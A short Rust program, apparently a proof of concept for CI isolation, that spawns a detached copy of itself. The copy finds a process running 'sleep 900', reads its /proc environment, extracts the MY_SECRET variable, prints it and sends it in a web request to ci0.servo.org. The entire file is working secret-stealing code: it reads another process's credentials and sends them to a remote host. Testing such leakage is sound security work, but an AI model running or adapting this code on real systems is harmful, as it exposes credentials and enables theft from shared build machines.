use std::{env, error::Error, fs::File, io::Read, process::Command, thread::sleep, time::Duration};

use cmd_lib::run_fun;
use reqwest::blocking::get;

fn main() -> Result<(), Box<dyn Error>> {
    // usage: process_workload
    //    or: process_workload child
    if env::args().nth(1).as_deref() == Some("child") {
        for _ in 0..10 {
            sleep(Duration::from_secs(1));
            let Ok(pid) = run_fun!(pgrep -f "sleep 900") else {
                println!("pid not found");
                continue;
            };
            println!("found pid {pid}");
            let mut environ = vec![];
            File::open(format!("/proc/{pid}/environ"))?.read_to_end(&mut environ)?;
            for var in environ.split(|byte| *byte == 0) {
                if let Some(secret) = var.strip_prefix(b"MY_SECRET=") {
                    let secret = str::from_utf8(secret)?;
                    println!("found secret: {secret}");
                    get(format!("https://ci0.servo.org/secret?value={secret}"))?;
                    return Ok(());
                }
            }
            println!("secret not found");
        }
    } else {
        Command::new("target/debug/process_workload")
            .arg("child")
            .spawn()?;
    }

    Ok(())
}
